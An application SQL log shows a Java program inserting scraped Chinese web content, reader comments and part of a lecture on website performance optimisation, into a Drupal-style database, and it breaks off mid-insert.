2020-11-19 11:04:25.894 INFO  jdbc.sqltiming Line:373 - insert into node_revision__field_comment (bundle, field_comment_value, delta, field_comment_format, 
langcode, revision_id, entity_id) values ('book', '<li class="reJj6Thl_0"><img src="https://static001.geekbang.org/account/avatar/00/13/db/26/54f2c164.jpg" 
class="_2273kGdT_0"> <div class="_2CG0SquK_0"> <div class="_304R4gla_0"> <div> <div class="_18Dng5rT_0"> 
<a>靠人品去赢</a> <!----> </div> <div class="_1H1Z49Dr_0"> 2019-12-02 </div> </div> <!----> </div> 
<div> <div class="_3M6kV3zb_0"> 这篇文章，让我联想到秒杀活动的设计，反正就是不让你大流量直接进入到服务器就是了，想了一下所谓的秒杀，真的就是耍猴。 </div> 
<div class="_2r3UB1GX_0"> <span>展开</span><i class="iconfont"></i> </div> <!----> <div class="_1w8H0ktn_0 
_2A421P4G_0"> <div class="_2jsFl-X0_0"> <i class="iconfont"></i> <span></span> </div> <div 
class="_2P4B1Hdm_0"> <i class="iconfont"></i> <span class=""></span> </div> <!----> </div> 
</div> </div></li> <li class="reJj6Thl_0"><img src="https://static001.geekbang.org/account/avatar/00/0f/4d/fd/0aa0e39f.jpg" 
class="_2273kGdT_0"> <div class="_2CG0SquK_0"> <div class="_304R4gla_0"> <div> <div class="_18Dng5rT_0"> 
<a>许童童</a> <!----> </div> <div class="_1H1Z49Dr_0"> 2019-12-02 </div> </div> <!----> </div> 
<div> <div class="_3M6kV3zb_0"> 老师的文章写得真好，读起来意犹未尽 </div> <div class="_2r3UB1GX_0"> <span>展开</span><i 
class="iconfont"></i> </div> <!----> <div class="_1w8H0ktn_0 _2A421P4G_0"> <div class="_2jsFl-X0_0"> 
<i class="iconfont"></i> <span></span> </div> <div class="_2P4B1Hdm_0"> <i class="iconfont"></i> 
<span class=""></span> </div> <!----> </div> </div> </div></li>', 0, 'full_html', 'zh-hans', 
9, 9) 
 {executed in 0 msec}
2020-11-19 11:04:25.897 INFO  jdbc.sqltiming Line:373 - select bookfieldt0_.entity_id as entity_i1_8_, bookfieldt0_.bundle as bundle2_8_, bookfieldt0_.delta 
as delta3_8_, bookfieldt0_.langcode as langcode4_8_, bookfieldt0_.revision_id as revision5_8_, 
bookfieldt0_.field_thumb_value as field_th6_8_ from node__field_thumb bookfieldt0_ where bookfieldt0_.entity_id=9 
 {executed in 0 msec}
2020-11-19 11:04:25.898 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------|------------------|
|entity_id |bundle |delta |langcode |revision_id |field_thumb_value |
|----------|-------|------|---------|------------|------------------|
|----------|-------|------|---------|------------|------------------|

2020-11-19 11:04:25.899 INFO  jdbc.sqltiming Line:373 - select bookfieldt0_.entity_id as entity_i1_8_0_, bookfieldt0_.bundle as bundle2_8_0_, bookfieldt0_.delta 
as delta3_8_0_, bookfieldt0_.langcode as langcode4_8_0_, bookfieldt0_.revision_id as revision5_8_0_, 
bookfieldt0_.field_thumb_value as field_th6_8_0_ from node__field_thumb bookfieldt0_ where 
bookfieldt0_.entity_id=9 
 {executed in 1 msec}
2020-11-19 11:04:25.899 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------|------------------|
|entity_id |bundle |delta |langcode |revision_id |field_thumb_value |
|----------|-------|------|---------|------------|------------------|
|----------|-------|------|---------|------------|------------------|

2020-11-19 11:04:25.900 INFO  jdbc.sqltiming Line:373 - insert into node__field_thumb (bundle, delta, langcode, revision_id, field_thumb_value, entity_id) 
values ('book', 0, 'zh-hans', 9, 'https://static001.geekbang.org/resource/image/3b/33/3b1a6078ea99774d37b448b6e2fcb233.jpg', 
9) 
 {executed in 0 msec}
2020-11-19 11:04:25.904 INFO  jdbc.sqltiming Line:373 - select nodefieldt0_.entity_id as entity_i1_17_0_, nodefieldt0_.bundle as bundle2_17_0_, nodefieldt0_.delta 
as delta3_17_0_, nodefieldt0_.langcode as langcode4_17_0_, nodefieldt0_.revision_id as revision5_17_0_, 
nodefieldt0_.field_thumb_value as field_th6_17_0_ from node_revision__field_thumb nodefieldt0_ 
where nodefieldt0_.entity_id=9 
 {executed in 1 msec}
2020-11-19 11:04:25.904 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------|------------------|
|entity_id |bundle |delta |langcode |revision_id |field_thumb_value |
|----------|-------|------|---------|------------|------------------|
|----------|-------|------|---------|------------|------------------|

2020-11-19 11:04:25.905 INFO  jdbc.sqltiming Line:373 - insert into node_revision__field_thumb (bundle, delta, langcode, revision_id, field_thumb_value, 
entity_id) values ('book', 0, 'zh-hans', 9, 'https://static001.geekbang.org/resource/image/3b/33/3b1a6078ea99774d37b448b6e2fcb233.jpg', 
9) 
 {executed in 0 msec}
2020-11-19 11:04:25.908 INFO  jdbc.sqltiming Line:373 - select bookfieldf0_.entity_id as entity_i1_5_0_, bookfieldf0_.bundle as bundle2_5_0_, bookfieldf0_.delta 
as delta3_5_0_, bookfieldf0_.field_fenlei_target_id as field_fe4_5_0_, bookfieldf0_.langcode 
as langcode5_5_0_, bookfieldf0_.revision_id as revision6_5_0_ from node__field_fenlei bookfieldf0_ 
where bookfieldf0_.entity_id=9 
 {executed in 0 msec}
2020-11-19 11:04:25.908 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|-----------------------|---------|------------|
|entity_id |bundle |delta |field_fenlei_target_id |langcode |revision_id |
|----------|-------|------|-----------------------|---------|------------|
|----------|-------|------|-----------------------|---------|------------|

2020-11-19 11:04:25.909 INFO  jdbc.sqltiming Line:373 - insert into node__field_fenlei (bundle, delta, field_fenlei_target_id, langcode, revision_id, 
entity_id) values ('book', 0, 1, 'zh-hans', 9, 9) 
 {executed in 0 msec}
2020-11-19 11:04:25.912 INFO  jdbc.sqltiming Line:373 - select nodefieldf0_.entity_id as entity_i1_14_0_, nodefieldf0_.bundle as bundle2_14_0_, nodefieldf0_.delta 
as delta3_14_0_, nodefieldf0_.field_fenlei_target_id as field_fe4_14_0_, nodefieldf0_.langcode 
as langcode5_14_0_, nodefieldf0_.revision_id as revision6_14_0_ from node_revision__field_fenlei 
nodefieldf0_ where nodefieldf0_.entity_id=9 
 {executed in 0 msec}
2020-11-19 11:04:25.912 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|-----------------------|---------|------------|
|entity_id |bundle |delta |field_fenlei_target_id |langcode |revision_id |
|----------|-------|------|-----------------------|---------|------------|
|----------|-------|------|-----------------------|---------|------------|

2020-11-19 11:04:25.913 INFO  jdbc.sqltiming Line:373 - insert into node_revision__field_fenlei (bundle, delta, field_fenlei_target_id, langcode, revision_id, 
entity_id) values ('book', 0, 1, 'zh-hans', 9, 9) 
 {executed in 0 msec}
2020-11-19 11:05:09.353 INFO  jdbc.sqltiming Line:373 - select bookfieldf0_.entity_id as entity_i1_6_, bookfieldf0_.bundle as bundle2_6_, bookfieldf0_.delta 
as delta3_6_, bookfieldf0_.field_fsid_value as field_fs4_6_, bookfieldf0_.langcode as langcode5_6_, 
bookfieldf0_.revision_id as revision6_6_ from node__field_fsid bookfieldf0_ where bookfieldf0_.field_fsid_value='424989659717662' 
 {executed in 1 msec}
2020-11-19 11:05:09.353 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|-----------------|---------|------------|
|entity_id |bundle |delta |field_fsid_value |langcode |revision_id |
|----------|-------|------|-----------------|---------|------------|
|----------|-------|------|-----------------|---------|------------|

2020-11-19 11:05:09.355 INFO  jdbc.sqltiming Line:373 - insert into node_revision (langcode, nid, revision_default, revision_timestamp, revision_uid) 
values ('zh-hans', 0, 1, 1605755109, 1) 
 {executed in 0 msec}
2020-11-19 11:05:09.356 INFO  jdbc.sqltiming Line:373 - getGeneratedKeys on query: insert into node_revision (langcode, nid, revision_default, revision_timestamp, 
revision_uid) values ('zh-hans', 0, 1, 1605755109, 1) 
 {executed in 0 msec}
2020-11-19 11:05:09.356 INFO  jdbc.resultsettable Line:610 - 
|--------------|
|generated_key |
|--------------|
|10            |
|--------------|

2020-11-19 11:05:09.366 INFO  jdbc.sqltiming Line:373 - insert into node (langcode, type, uuid, vid) values ('zh-hans', 'book', '62ff4853-b659-4792-9abb-7589a6ac6ae4', 
10) 
 {executed in 0 msec}
2020-11-19 11:05:09.367 INFO  jdbc.sqltiming Line:373 - getGeneratedKeys on query: insert into node (langcode, type, uuid, vid) values ('zh-hans', 
'book', '62ff4853-b659-4792-9abb-7589a6ac6ae4', 10) 
 {executed in 0 msec}
2020-11-19 11:05:09.367 INFO  jdbc.resultsettable Line:610 - 
|--------------|
|generated_key |
|--------------|
|10            |
|--------------|

2020-11-19 11:05:09.386 INFO  jdbc.sqltiming Line:373 - update node_revision set langcode='zh-hans', nid=10, revision_default=1, revision_timestamp=1605755109, 
revision_uid=1 where vid=10 
 {executed in 0 msec}
2020-11-19 11:05:09.390 INFO  jdbc.sqltiming Line:373 - select bookfieldf0_.entity_id as entity_i1_6_0_, bookfieldf0_.bundle as bundle2_6_0_, bookfieldf0_.delta 
as delta3_6_0_, bookfieldf0_.field_fsid_value as field_fs4_6_0_, bookfieldf0_.langcode as langcode5_6_0_, 
bookfieldf0_.revision_id as revision6_6_0_ from node__field_fsid bookfieldf0_ where bookfieldf0_.entity_id=10 
 {executed in 0 msec}
2020-11-19 11:05:09.391 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|-----------------|---------|------------|
|entity_id |bundle |delta |field_fsid_value |langcode |revision_id |
|----------|-------|------|-----------------|---------|------------|
|----------|-------|------|-----------------|---------|------------|

2020-11-19 11:05:09.392 INFO  jdbc.sqltiming Line:373 - insert into node__field_fsid (bundle, delta, field_fsid_value, langcode, revision_id, entity_id) 
values ('book', 0, '424989659717662', 'zh-hans', 10, 10) 
 {executed in 0 msec}
2020-11-19 11:05:09.396 INFO  jdbc.sqltiming Line:373 - select nodefieldf0_.entity_id as entity_i1_15_0_, nodefieldf0_.bundle as bundle2_15_0_, nodefieldf0_.delta 
as delta3_15_0_, nodefieldf0_.field_fsid_value as field_fs4_15_0_, nodefieldf0_.langcode as 
langcode5_15_0_, nodefieldf0_.revision_id as revision6_15_0_ from node_revision__field_fsid 
nodefieldf0_ where nodefieldf0_.entity_id=10 
 {executed in 0 msec}
2020-11-19 11:05:09.397 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|-----------------|---------|------------|
|entity_id |bundle |delta |field_fsid_value |langcode |revision_id |
|----------|-------|------|-----------------|---------|------------|
|----------|-------|------|-----------------|---------|------------|

2020-11-19 11:05:09.398 INFO  jdbc.sqltiming Line:373 - insert into node_revision__field_fsid (bundle, delta, field_fsid_value, langcode, revision_id, 
entity_id) values ('book', 0, '424989659717662', 'zh-hans', 10, 10) 
 {executed in 0 msec}
2020-11-19 11:05:09.402 INFO  jdbc.sqltiming Line:373 - select bookentity0_.nid as nid1_1_, bookentity0_.bid as bid2_1_, bookentity0_.depth as depth3_1_, 
bookentity0_.has_children as has_chil4_1_, bookentity0_.p1 as p5_1_, bookentity0_.p2 as p6_1_, 
bookentity0_.p3 as p7_1_, bookentity0_.p4 as p8_1_, bookentity0_.p5 as p9_1_, bookentity0_.pid 
as pid10_1_, bookentity0_.weight as weight11_1_ from book bookentity0_ where bookentity0_.nid=10 
 {executed in 0 msec}
2020-11-19 11:05:09.402 INFO  jdbc.resultsettable Line:610 - 
|----|----|------|-------------|---|---|---|---|---|----|-------|
|nid |bid |depth |has_children |p1 |p2 |p3 |p4 |p5 |pid |weight |
|----|----|------|-------------|---|---|---|---|---|----|-------|
|----|----|------|-------------|---|---|---|---|---|----|-------|

2020-11-19 11:05:09.403 INFO  jdbc.sqltiming Line:373 - select bookentity0_.nid as nid1_1_0_, bookentity0_.bid as bid2_1_0_, bookentity0_.depth as 
depth3_1_0_, bookentity0_.has_children as has_chil4_1_0_, bookentity0_.p1 as p5_1_0_, bookentity0_.p2 
as p6_1_0_, bookentity0_.p3 as p7_1_0_, bookentity0_.p4 as p8_1_0_, bookentity0_.p5 as p9_1_0_, 
bookentity0_.pid as pid10_1_0_, bookentity0_.weight as weight11_1_0_ from book bookentity0_ 
where bookentity0_.nid=10 
 {executed in 0 msec}
2020-11-19 11:05:09.403 INFO  jdbc.resultsettable Line:610 - 
|----|----|------|-------------|---|---|---|---|---|----|-------|
|nid |bid |depth |has_children |p1 |p2 |p3 |p4 |p5 |pid |weight |
|----|----|------|-------------|---|---|---|---|---|----|-------|
|----|----|------|-------------|---|---|---|---|---|----|-------|

2020-11-19 11:05:09.404 INFO  jdbc.sqltiming Line:373 - insert into book (bid, depth, has_children, p1, p2, p3, p4, p5, pid, weight, nid) values (1, 
3, 0, 1, 4, 10, 0, 0, 4, 0, 10) 
 {executed in 0 msec}
2020-11-19 11:05:09.408 INFO  jdbc.sqltiming Line:373 - select nodebodyen0_.entity_id as entity_i1_3_, nodebodyen0_.body_value as body_val2_3_, nodebodyen0_.body_summary 
as body_sum3_3_, nodebodyen0_.bundle as bundle4_3_, nodebodyen0_.delta as delta5_3_, nodebodyen0_.body_format 
as body_for6_3_, nodebodyen0_.langcode as langcode7_3_, nodebodyen0_.revision_id as revision8_3_ 
from node__body nodebodyen0_ where nodebodyen0_.entity_id=10 
 {executed in 0 msec}
2020-11-19 11:05:09.409 INFO  jdbc.resultsettable Line:610 - 
|----------|-----------|-------------|-------|------|------------|---------|------------|
|entity_id |body_value |body_summary |bundle |delta |body_format |langcode |revision_id |
|----------|-----------|-------------|-------|------|------------|---------|------------|
|----------|-----------|-------------|-------|------|------------|---------|------------|

2020-11-19 11:05:09.409 INFO  jdbc.sqltiming Line:373 - select nodebodyre0_.entity_id as entity_i1_12_0_, nodebodyre0_.body_value as body_val2_12_0_, 
nodebodyre0_.body_summary as body_sum3_12_0_, nodebodyre0_.bundle as bundle4_12_0_, nodebodyre0_.delta 
as delta5_12_0_, nodebodyre0_.body_format as body_for6_12_0_, nodebodyre0_.langcode as langcode7_12_0_, 
nodebodyre0_.revision_id as revision8_12_0_ from node_revision__body nodebodyre0_ where nodebodyre0_.entity_id=10 
 {executed in 0 msec}
2020-11-19 11:05:09.410 INFO  jdbc.resultsettable Line:610 - 
|----------|-----------|-------------|-------|------|------------|---------|------------|
|entity_id |body_value |body_summary |bundle |delta |body_format |langcode |revision_id |
|----------|-----------|-------------|-------|------|------------|---------|------------|
|----------|-----------|-------------|-------|------|------------|---------|------------|

2020-11-19 11:05:09.428 INFO  jdbc.sqltiming Line:373 - insert into node_revision__body (body_value, body_summary, bundle, delta, body_format, langcode, 
revision_id, entity_id) values ('<div data-slate-editor="true" data-key="994" autocorrect="off" 
spellcheck="false" data-gramm="false" style="outline: none; white-space: pre-wrap; overflow-wrap: 
break-word;"> <div class="se-a1a5edcc " data-slate-type="paragraph" data-slate-object="block" 
data-key="995"> <span data-slate-object="text" data-key="996"><span data-slate-leaf="true" 
data-offset-key="996:0" data-first-offset="true"><span data-slate-string="true">你好，我是四火。</span></span></span> 
</div> <div class="se-ad26e9b2 " data-slate-type="paragraph" data-slate-object="block" data-key="997"> 
<span data-slate-object="text" data-key="998"><span data-slate-leaf="true" data-offset-key="998:0" 
data-first-offset="true"><span data-slate-string="true">上一讲我们介绍了网站性能优化的基础知识，包括性能指标、关注点，以及寻找性能瓶颈的思路。那么这一讲，我们就来介绍网站性能优化的具体方法，我们将从产品和架构、后端和持久层，以及前端和网络层这样三个部分分别展开。优化的角度和方法可以说花样繁多，我在这里举一些典型的例子，希望既能给你一些内容上的介绍，进而拓宽视野，也能给你一些思考角度上的启发。</span></span></span> 
</div> <h2 class="se-4de06332" data-slate-type="heading" data-slate-object="block" data-key="999"><span 
data-slate-object="text" data-key="1000"><span data-slate-leaf="true" data-offset-key="1000:0" 
data-first-offset="true"><span data-slate-string="true">产品和架构调整</span></span></span></h2> <div 
class="se-e6b0a805 " data-slate-type="paragraph" data-slate-object="block" data-key="1001"> 
<span data-slate-object="text" data-key="1002"><span data-slate-leaf="true" data-offset-key="1002:0" 
data-first-offset="true"><span data-slate-string="true">对于一个应用来说，产品和架构恰巧是两个互相对立而又相辅相成的角度。作为全栈工程师，我们当然鼓励追求细节，但是在考虑性能优化的时候，我认为还是要</span></span></span><span 
data-slate-object="text" data-key="1003"><span data-slate-leaf="true" data-offset-key="1003:0" 
data-first-offset="true"><span class="se-0da322c4" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">优先考虑从大处着眼，而不是把大量时间花费在小处的细节提升上</span></span></span></span><span data-slate-object="text" 
data-key="1004"><span data-slate-leaf="true" data-offset-key="1004:0" data-first-offset="true"><span 
data-slate-string="true">，以期望获得较为明显的效果。这里的“大处”，就主要包含了产品和技术架构两个维度。</span></span></span> </div> 
<h3 class="se-d87c2163" data-slate-type="heading" data-slate-object="block" data-key="1005"><span 
data-slate-object="text" data-key="1006"><span data-slate-leaf="true" data-offset-key="1006:0" 
data-first-offset="true"><span data-slate-string="true">1. 同步变异步</span></span></span></h3> 
<div class="se-31ac52c7 " data-slate-type="paragraph" data-slate-object="block" data-key="1007"> 
<span data-slate-object="text" data-key="1008"><span data-slate-leaf="true" data-offset-key="1008:0" 
data-first-offset="true"><span data-slate-string="true">如果页面聚合在服务端进行，那么渲染前等待的时间，在整个任务依赖树上面，取决于最慢的一个路径什么时候完成；而如果页面聚合是在客户端进行的，那么页面每一个子区域的渲染往往都可以以 
Ajax 的方式独立进行，且同时进行，而母页面则可以首先展示给用户，减少用户的等待时间。</span></span></span> </div> <div class="se-921faffa 
" data-slate-type="paragraph" data-slate-object="block" data-key="1009"> <span data-slate-object="text" 
data-key="1010"><span data-slate-leaf="true" data-offset-key="1010:0" data-first-offset="true"><span 
data-slate-string="true">这里我还想补充一点，我们可以把同步和异步结合起来使用以获得最好的效果。比方说，用户对于网页加载的延迟是很敏锐的，但是用户对于一个页面上不同的信息，关注程度是不同的。</span></span></span> 
</div> <div class="se-155a9cb4 " data-slate-type="paragraph" data-slate-object="block" data-key="1011"> 
<span data-slate-object="text" data-key="1012"><span data-slate-leaf="true" data-offset-key="1012:0" 
data-first-offset="true"><span data-slate-string="true">举例来说，一篇文章，标题可能是最先关注的，其次才是作者或是正文，至于评论、广告等等这些内容，优先级则更低。因此，我们可以让标题和正文内容的第一屏等高优先级的内容在服务端进行聚合后一并同步返回，这就省去了 
Ajax 二次调用的时间开销，而次要内容或是某些生成特别耗时的内容，则可以使用异步方式在客户端单独加载。</span></span></span> </div> <h3 class="se-9099d3a4" 
data-slate-type="heading" data-slate-object="block" data-key="1013"><span data-slate-object="text" 
data-key="1014"><span data-slate-leaf="true" data-offset-key="1014:0" data-first-offset="true"><span 
data-slate-string="true">2. 远程变本地</span></span></span></h3> <div class="se-e3823312 " data-slate-type="paragraph" 
data-slate-object="block" data-key="1015"> <span data-slate-object="text" data-key="1016"><span 
data-slate-leaf="true" data-offset-key="1016:0" data-first-offset="true"><span data-slate-string="true">有些时候，如果能够容许牺牲一定的一致性，而将数据从远程的数据中心冗余到“本地”这样离数据使用者更近的节点，可以减少数据获取的延迟。DNS 
的均衡路由就是一个例子，不同地区的用户访问同一个域名的时候，可以被定向到不同的离自己更近的节点上去；CDN 也是一个很典型的例子，静态资源可以从较近的本地节点获取。</span></span></span> 
</div> <h3 class="se-a03284b9" data-slate-type="heading" data-slate-object="block" data-key="1017"><span 
data-slate-object="text" data-key="1018"><span data-slate-leaf="true" data-offset-key="1018:0" 
data-first-offset="true"><span data-slate-string="true">3. 页面静态化</span></span></span></h3> 
<div class="se-9ca2b649 " data-slate-type="paragraph" data-slate-object="block" data-key="1019"> 
<span data-slate-object="text" data-key="1020"><span data-slate-leaf="true" data-offset-key="1020:0" 
data-first-offset="true"><span data-slate-string="true">对于为什么要从大处着眼，我来举一个我在项目中经历过的例子。在我们的一个网站项目，模板中使用了大量的 
OGNL 表达式，在做了 profiling 之后，发现 OGNL 表达式占用了相当比例的 CPU，而将其改成 EL 表达式等其它方式，这样做确实可以降低这些 CPU 的使用。这件事情其实没有错，但是这个处理的优先级应该往下放，因为这样的优化，可能只会带来 
10% 左右的最终性能提升。</span></span></span> </div> <div class="se-116f85cb " data-slate-type="paragraph" 
data-slate-object="block" data-key="1021"> <span data-slate-object="text" data-key="1022"><span 
data-slate-leaf="true" data-offset-key="1022:0" data-first-offset="true"><span data-slate-string="true">但是另一方面，我们逐渐引入了页面静态化技术，对于几个关键页面，它直接带来了 
300% 到 800% 的性能提升，这就让前面的页面模板的调整显得无足轻重了。性能优化就是这样，并非简单的“一分耕耘一分收获”，有时候我们能找到一些优化的办法，看起来效果很明显，但是调整的代价却不大。</span></span></span> 
</div> <div class="se-5b8fe9de " data-slate-type="paragraph" data-slate-object="block" data-key="1023"> 
<span data-slate-object="text" data-key="1024"><span data-slate-leaf="true" data-offset-key="1024:0" 
data-first-offset="true"><span data-slate-string="true">关于页面静态化，我来举一个 </span></span></span><a 
data-slate-type="link" data-slate-object="inline" data-key="1025" class="se-bd361ee3 se-f81bfce9"><span 
data-slate-object="text" data-key="1026"><span data-slate-leaf="true" data-offset-key="1026:0" 
data-first-offset="true"><span data-slate-string="true">StackOverflow</span></span></span></a><span 
data-slate-object="text" data-key="1027"><span data-slate-leaf="true" data-offset-key="1027:0" 
data-first-offset="true"><span data-slate-string="true"> 的例子：</span></span></span> </div> <div 
class="se-8bb6d9b4" data-slate-type="image" data-slate-object="block" data-key="1028"> <img 
class="se-c1c93fa2" src="https://static001.geekbang.org/resource/image/b0/fc/b0980cecf4fdc829e6f931acd8822efc.png"> 
</div> <div class="se-33184c91 " data-slate-type="paragraph" data-slate-object="block" data-key="1029"> 
<span data-slate-object="text" data-key="1030"><span data-slate-leaf="true" data-offset-key="1030:0" 
data-first-offset="true"><span data-slate-string="true">你看这个 StackOverflow 的页面，我们就可以按照页面静态化的原则来分析：把它划分为几个不同的区域，每个区域都可以具备自己特有的一致性要求，无论是页面还是数据，都可以单独做不同条件下的缓存。</span></span></span> 
</div> <div class="se-b40f847b " data-slate-type="paragraph" data-slate-object="block" data-key="1031"> 
<span data-slate-object="text" data-key="1032"><span data-slate-leaf="true" data-offset-key="1032:0" 
data-first-offset="true"><span data-slate-string="true">比方说，正上方和左侧区域是不会变的，这些内容可以写在静态的 HTML 
页面模板里，可以说是完全“静态”的；中间的主问题区域，则可能是定期或按一定规则刷新的，相当于在过期时间内也是静态的；而右上角和用户相关的数据，则需要每次页面访问实时生成，以便让不同的用户看到特有的属于他自己的内容，也就是说，这部分内容是完全“动态”的。</span></span></span> 
</div> <div class="se-8cd888d1 " data-slate-type="paragraph" data-slate-object="block" data-key="1033"> 
<span data-slate-object="text" data-key="1034"><span data-slate-leaf="true" data-offset-key="1034:0" 
data-first-offset="true"><span data-slate-string="true">页面静态化的实践中，我们可以将页面解耦成不同的部分：</span></span></span> 
</div> <div class="se-a38e4d7c" data-slate-type="list" data-slate-object="block" data-key="1035"> 
<div class="se-ee04bd90 se-2cd33ef0" data-slate-type="list-line" data-slate-object="block" 
data-key="1036"> <span data-slate-object="text" data-key="1037"><span data-slate-leaf="true" 
data-offset-key="1037:0" data-first-offset="true"><span data-slate-string="true">从产品的角度来定义每一个部分允许的一致性窗口，比如有的数据是一小时更新一次，数据可以不用非常准确，而有的则是要实时，数据要求非常准确；</span></span></span> 
</div> <div class="se-4c780b68 se-53d1cc67" data-slate-type="list-line" data-slate-object="block" 
data-key="1038"> <span data-slate-object="text" data-key="1039"><span data-slate-leaf="true" 
data-offset-key="1039:0" data-first-offset="true"><span data-slate-string="true">而技术角度，对于每一部分不同的一致性要求，依赖于缓存的特性，也就是空间换时间，我们可以让每个部分进行分别管理，最终聚合起来（页面聚合的方式请参见 
</span></span></span><a data-slate-type="link" data-slate-object="inline" data-key="1040" class="se-bd361ee3 
se-f81bfce9"><span data-slate-object="text" data-key="1041"><span data-slate-leaf="true" data-offset-key="1041:0" 
data-first-offset="true"><span data-slate-string="true">[第 09 讲]</span></span></span></a><span 
data-slate-object="text" data-key="1042"><span data-slate-leaf="true" data-offset-key="1042:0" 
data-first-offset="true"><span data-slate-string="true">）。</span></span></span> </div> </div> 
<div class="se-a861d799 " data-slate-type="paragraph" data-slate-object="block" data-key="1043"> 
<span data-slate-object="text" data-key="1044"><span data-slate-leaf="true" data-offset-key="1044:0" 
data-first-offset="true"><span data-slate-string="true">在极端的情况下，整个页面是可以直接完全被缓存起来，甚至直接预先生成，而做到全页面静态化的，比如一些几乎不存在个性内容的静态博客站点就是如此。</span></span></span> 
</div> <div class="se-e5b6cfdb " data-slate-type="paragraph" data-slate-object="block" data-key="1045"> 
<span data-slate-object="text" data-key="1046"><span data-slate-leaf="true" data-offset-key="1046:0" 
data-first-offset="true"><span data-slate-string="true">当然，还有许多常见的其它架构上的设计，起着提高网站性能的作用，没有展开介绍，是因为它们已经被介绍过，或者是大家普遍比较熟悉了。比如说，对反向代理、集群和负载分担的使用，这些技术我们分别在 
</span></span></span><a data-slate-type="link" data-slate-object="inline" data-key="1047" class="se-bd361ee3 
se-f81bfce9"><span data-slate-object="text" data-key="1048"><span data-slate-leaf="true" data-offset-key="1048:0" 
data-first-offset="true"><span data-slate-string="true">[第 28 讲]</span></span></span></a><span 
data-slate-object="text" data-key="1049"><span data-slate-leaf="true" data-offset-key="1049:0" 
data-first-offset="true"><span data-slate-string="true"> 和 </span></span></span><a data-slate-type="link" 
data-slate-object="inline" data-key="1050" class="se-bd361ee3 se-f81bfce9"><span data-slate-object="text" 
data-key="1051"><span data-slate-leaf="true" data-offset-key="1051:0" data-first-offset="true"><span 
data-slate-string="true">[第 29 讲]</span></span></span></a><span data-slate-object="text" data-key="1052"><span 
data-slate-leaf="true" data-offset-key="1052:0" data-first-offset="true"><span data-slate-string="true"> 
介绍过，如今几乎所有的大型网站都使用它们来组网。</span></span></span> </div> <h2 class="se-0ffe6d06" data-slate-type="heading" 
data-slate-object="block" data-key="1053"><span data-slate-object="text" data-key="1054"><span 
data-slate-leaf="true" data-offset-key="1054:0" data-first-offset="true"><span data-slate-string="true">后端和持久层优化</span></span></span></h2> 
<h3 class="se-45e74932" data-slate-type="heading" data-slate-object="block" data-key="1055"><span 
data-slate-object="text" data-key="1056"><span data-slate-leaf="true" data-offset-key="1056:0" 
data-first-offset="true"><span data-slate-string="true">1. 串行变并行</span></span></span></h3> 
<div class="se-9a61c776 " data-slate-type="paragraph" data-slate-object="block" data-key="1057"> 
<span data-slate-object="text" data-key="1058"><span data-slate-leaf="true" data-offset-key="1058:0" 
data-first-offset="true"><span data-slate-string="true">道理上很简单，串行的逻辑，在没有依赖限制的情况下，可以并行执行。后端的逻辑如果需要执行多项操作，那么如果没有依赖，或者依赖项满足的情况下，可以立即执行，而不必一个一个挨个等待依次完成。Spring 
的 </span></span></span><a data-slate-type="link" data-slate-object="inline" data-key="1059" 
class="se-bd361ee3 se-f81bfce9"><span data-slate-object="text" data-key="1060"><span data-slate-leaf="true" 
data-offset-key="1060:0" data-first-offset="true"><span data-slate-string="true">@Async</span></span></span></a><span 
data-slate-object="text" data-key="1061"><span data-slate-leaf="true" data-offset-key="1061:0" 
data-first-offset="true"><span data-slate-string="true"> 注解，可以比较方便地将普通的 Java 方法调用变成异步进行的，用这种方法可以同时执行数个互不依赖的方法。</span></span></span> 
</div> <div class="se-396348c0 " data-slate-type="paragraph" data-slate-object="block" data-key="1062"> 
<span data-slate-object="text" data-key="1063"><span data-slate-leaf="true" data-offset-key="1063:0" 
data-first-offset="true"><span data-slate-string="true">有些朋友可能知道，Amazon 是 SOA 架构（Service-Oriented 
Architecture，面向服务架构）最早的践行者。贝索斯在 2002 年的时候，就开始要求 Amazon 内部的所有服务，都只能以 Web 接口的形式暴露出来，供其他团队调用，而每个服务，都由专门的团队维护。如今，访问亚马逊的一个商品页，借助 
SOA 架构，后台都要调用成百上千个开放的服务，你可以想象，如果这些调用是串行进行的，页面的加载时间将难以想象。</span></span></span> </div> <h3 class="se-d1121986" 
data-slate-type="heading" data-slate-object="block" data-key="1064"><span data-slate-object="text" 
data-key="1065"><span data-slate-leaf="true" data-offset-key="1065:0" data-first-offset="true"><span 
data-slate-string="true">2. 数据库索引创建</span></span></span></h3> <div class="se-db31f383 " data-slate-type="paragraph" 
data-slate-object="block" data-key="1066"> <span data-slate-object="text" data-key="1067"><span 
data-slate-leaf="true" data-offset-key="1067:0" data-first-offset="true"><span data-slate-string="true">凡是提到关系数据库的优化，索引的创建往往是很容易想到的优化方法之一。而对于某些支持半结构化数据存储的非关系数据库，往往也对索引存在有限的支持。</span></span></span> 
</div> <div class="se-285ee661 " data-slate-type="paragraph" data-slate-object="block" data-key="1068"> 
<span data-slate-object="text" data-key="1069"><span data-slate-leaf="true" data-offset-key="1069:0" 
data-first-offset="true"><span data-slate-string="true">索引的创建，最常见的一个原因，是为了在查询的时候，显著减少消耗的时间。由于索引是单独以 
B 树或者是 B+ 树等变种来存储的，而我们知道这样的数据结构查询的速度可以达到 log(n)，和原表相比，索引在检索时的数据的读取量又很小，因此查询速度的提升往往是立竿见影的。</span></span></span> 
</div> <div class="se-d3d62331 " data-slate-type="paragraph" data-slate-object="block" data-key="1070"> 
<span data-slate-object="text" data-key="1071"><span data-slate-leaf="true" data-offset-key="1071:0" 
data-first-offset="true"><span data-slate-string="true">但是索引创建并非是没有代价的，在关系数据库中，索引作为原表中索引列数据的一份冗余，维护它自然是有开销的，每当索引数据增、删、改发生的时候，索引也需要相应地发生变化。</span></span></span> 
</div> <h3 class="se-9ff35037" data-slate-type="heading" data-slate-object="block" data-key="1072"><span 
data-slate-object="text" data-key="1073"><span data-slate-leaf="true" data-offset-key="1073:0" 
data-first-offset="true"><span data-slate-string="true">3. 数据库表拆分</span></span></span></h3> 
<div class="se-f3c41ed2 " data-slate-type="paragraph" data-slate-object="block" data-key="1074"> 
